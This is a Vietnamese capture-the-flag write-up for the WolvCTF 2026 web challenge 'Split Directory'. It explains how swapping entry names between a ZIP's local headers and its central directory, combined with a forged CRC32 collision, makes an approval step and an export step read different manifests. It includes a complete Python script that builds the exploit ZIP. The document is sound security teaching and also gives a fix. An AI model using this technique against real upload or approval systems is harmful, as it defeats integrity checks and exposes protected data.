+++
title = "WolvCTF 2026 — Split Directory"
date = 2026-11-22T00:00:00+07:00
draft = false
tags = ["WolvCTF 2026", "Web", "ZIP", "CRC32"]
categories = ["Writeups"]
summary = "Tráo tên trong Local File Header và Central Directory để /approve duyệt manifest public còn /export trả sealed/report."
ShowToc = true
TocOpen = false
+++

Mục tiêu của bài Split Directory là làm cho `/api/export` trả về `sealed/report`. Handout yêu cầu upload một ZIP_STORED compact gồm đúng hai entry, theo thứ tự `archive.note` rồi `manifest.txt`. Manifest phải bắt đầu bằng `EXPORT public/<name>`; khi duyệt, service lưu receipt gồm độ dài và CRC32 của manifest.

Mình để ý receipt chỉ ràng buộc hai con số, còn ZIP có thông tin tên entry được ghi ở cả Local File Header (LFH) lẫn Central Directory (CD). Nếu hai bước xử lý chọn tên từ hai nơi khác nhau, chúng có thể đọc ra hai nội dung khác nhau.

## Lần thử đầu bị chặn

Ban đầu mình thử khai nhỏ kích thước entry đầu để giấu thêm một Local File Header trong phần dữ liệu. Upload trả về `422 compact ZIP required`. Lỗi này cho thấy uploader kiểm tra các entry phải nằm sát nhau theo kích thước đã khai báo.

Mình đổi cách làm: giữ nguyên kích thước và offset để ZIP vẫn compact, chỉ tráo tên giữa LFH và CD.

## Tráo cách ZIP được diễn giải

Mình dựng hai entry vật lý như sau:

| Offset | Tên trong LFH | Nội dung |
|---|---|---|
| Đầu file | `manifest.txt` | `EXPORT sealed/report\n...` |
| Entry thứ hai | `archive.note` | `EXPORT public/welcome\n...` |

Trong CD, mình giữ đúng thứ tự mà đề yêu cầu nhưng cho các offset trỏ chéo:

| Tên trong CD | Offset được trỏ tới |
|---|---|
| `archive.note` | Entry đầu, có LFH tự ghi tên `manifest.txt` |
| `manifest.txt` | Entry thứ hai, có LFH tự ghi tên `archive.note` |

Với file này, `approve` lấy `manifest.txt` theo CD nên đọc nội dung `EXPORT public/welcome`. Còn luồng export quét LFH từ đầu file, gặp `manifest.txt` đầu tiên và lấy nội dung `EXPORT sealed/report`. Các kích thước và offset vẫn liền nhau nên payload qua được kiểm tra compact.

## Làm receipt khớp

Hai nội dung đều dài 48 byte. Mình giữ CRC32 của manifest public làm mục tiêu, rồi tính 4 byte đệm cho nội dung sealed để CRC32 của nó bằng đúng giá trị đó. Vì vậy receipt `(48, 0xC85F3932)` vẫn khớp khi export đọc sang nội dung còn lại.

Đoạn dưới tạo 4 byte cuối bằng cách giải hệ tuyến tính trên các bit của CRC32. Sau đó mình dùng chúng để dựng ZIP với hai bản khai tên không khớp nhau:

~~~python
import struct
import zlib


def force_crc32_suffix(prefix, target_crc):
    # Tính ảnh hưởng của từng bit trong 4 byte cuối lên CRC.
    base = zlib.crc32(prefix + bytes(4)) & 0xFFFFFFFF
    columns = []
    for bit in range(32):
        suffix = bytearray(4)
        suffix[bit // 8] = 1 << (bit % 8)
        columns.append(
            (zlib.crc32(prefix + suffix) & 0xFFFFFFFF) ^ base
        )

    rhs = target_crc ^ base
    rows = []
    for out_bit in range(32):
        coeff = sum(
            1 << in_bit
            for in_bit, column in enumerate(columns)
            if (column >> out_bit) & 1
        )
        rows.append(coeff | (((rhs >> out_bit) & 1) << 32))

    # Khử Gauss trên GF(2).
    pivot = 0
    for col in range(32):
        selected = next(
            (row for row in range(pivot, 32) if (rows[row] >> col) & 1),
            None,
        )
        if selected is None:
            continue
        rows[pivot], rows[selected] = rows[selected], rows[pivot]
        for row in range(32):
            if row != pivot and ((rows[row] >> col) & 1):
                rows[row] ^= rows[pivot]
        pivot += 1

    assert pivot == 32
    solution = 0
    for row in rows:
        coeff = row & 0xFFFFFFFF
        assert coeff and (coeff & (coeff - 1)) == 0
        bit = coeff.bit_length() - 1
        solution |= ((row >> 32) & 1) << bit

    return bytes((solution >> (8 * i)) & 0xFF for i in range(4))


def local_header(name, data):
    crc = zlib.crc32(data) & 0xFFFFFFFF
    size = len(data)
    return (
        struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50, 20, 0, 0, 0, 0x21,
            crc, size, size, len(name), 0,
        )
        + name
        + data
    )


def central_header(name, data, offset):
    crc = zlib.crc32(data) & 0xFFFFFFFF
    size = len(data)
    return (
        struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50, 20, 20, 0, 0, 0, 0x21,
            crc, size, size, len(name), 0, 0, 0, 0, 0, offset,
        )
        + name
    )


def eocd(count, cd_size, cd_offset):
    return struct.pack(
        "<IHHHHIIH",
        0x06054B50, 0, 0, count, count, cd_size, cd_offset, 0,
    )


length = 48

# Nội dung mà approve sẽ đọc theo Central Directory.
approved_prefix = b"EXPORT public/welcome\n"
approved = (
    approved_prefix + b"legit-receipt-note-filler!!"
)[:length].ljust(length, b"-")
target_crc = zlib.crc32(approved) & 0xFFFFFFFF

# Nội dung mà export sẽ đọc khi quét Local File Header.
sealed_prefix = b"EXPORT sealed/report\n"
sealed_before_patch = sealed_prefix + b"y" * (
    length - len(sealed_prefix) - 4
)
sealed = sealed_before_patch + force_crc32_suffix(
    sealed_before_patch, target_crc
)
assert len(sealed) == length
assert zlib.crc32(sealed) & 0xFFFFFFFF == target_crc

archive = bytearray()

# LFH đầu nói manifest.txt và chứa nội dung sealed.
off_first = len(archive)
archive += local_header(b"manifest.txt", sealed)

# LFH thứ hai nói archive.note và chứa manifest public.
off_second = len(archive)
archive += local_header(b"archive.note", approved)

# CD giữ thứ tự archive.note, manifest.txt nhưng tráo offset.
cd_offset = len(archive)
archive += central_header(b"archive.note", sealed, off_first)
archive += central_header(b"manifest.txt", approved, off_second)
cd_size = len(archive) - cd_offset

archive += eocd(2, cd_size, cd_offset)
open("exploit.zip", "wb").write(archive)
~~~

## Root cause

Lỗi nằm ở chỗ approve và export diễn giải cùng một ZIP theo hai cách khác nhau mà không kiểm tra tên trong LFH có khớp tên trong CD hay không. Receipt chỉ gồm length và CRC32, nên nó không chứng minh nội dung là cùng một manifest: mình có thể tạo nội dung khác cùng độ dài và cùng CRC32.

Cách sửa là parse ZIP một lần, kiểm tra các metadata trùng lặp nhất quán, rồi dùng lại đúng entry đã duyệt khi export. Nếu cần ràng buộc nội dung, lưu digest mật mã như SHA-256 thay cho CRC32; nhưng digest chỉ có ý nghĩa khi cả hai bước dùng cùng bytes đã được xác thực.

## Kết quả

Ảnh dưới đây là phản hồi export mình nhận được sau khi upload và approve payload:

![Kết quả export trả về flag](/images/imported/wolvctf-2026/split-directory/flag-result.png)
